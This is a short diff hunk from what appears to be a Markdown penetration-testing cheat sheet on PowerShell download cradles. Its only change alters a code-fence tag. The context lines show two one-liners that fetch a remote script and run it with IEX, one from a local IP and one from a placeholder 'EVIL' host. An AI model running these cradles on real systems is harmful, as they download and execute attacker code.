@@ -21,7 +21,7 @@ iwr 'http://192.168.1.2/exploit.ps1' -UseBasicParsing | IEX
 
 ### Variantes
 
-```powershell
+```powershella
 ## from https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 # normal download cradle
 IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
